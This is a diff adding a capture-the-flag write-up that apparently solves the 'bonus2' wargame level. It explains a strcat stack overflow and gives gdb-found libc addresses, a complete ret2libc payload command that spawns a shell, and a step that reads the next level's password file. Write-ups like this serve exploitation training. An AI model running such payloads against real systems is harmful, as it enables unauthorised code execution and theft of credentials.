@@ -1,1 +1,32 @@
-TODO: Document the step-by-step exploitation process, commands, and reasoning.
+Goal: ret2libc to get a shell and read the next password.
+
+1) Vulnerability
+- main() builds a 72-byte name from argv1 (40) + argv2 (32).
+- greetuser() has a 72-byte stack buffer and does:
+  strcpy(greet, greeting); strcat(greet, name);
+- Any non-empty greeting makes strcat overflow greet and overwrite saved EIP.
+
+2) Choose LANG to control the offset
+- LANG=fi uses the longest greeting, so the overwrite hits earlier.
+- With a cyclic pattern in argv2, EIP becomes 0x41366141 ("Aa6A") => offset 18.
+- That means EIP is overwritten by argv2[18..21].
+
+3) Get libc addresses (in gdb)
+(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
+0xb7f8cc58
+(gdb) p system
+0xb7e6b060
+(gdb) p exit
+0xb7e5ebe0
+
+4) Build ret2libc payload
+- argv1: 40 bytes filler
+- argv2: 18 bytes filler + system + exit + "/bin/sh"
+
+Command:
+LANG=fi ./bonus2 \
+"$(python2 -c 'print "A"*40')" \
+"$(python2 -c 'import struct;print "B"*18 + struct.pack("<I",0xb7e6b060) + struct.pack("<I",0xb7e5ebe0) + struct.pack("<I",0xb7f8cc58)')"
+
+5) Read the password
+cat /home/user/bonus3/.pass
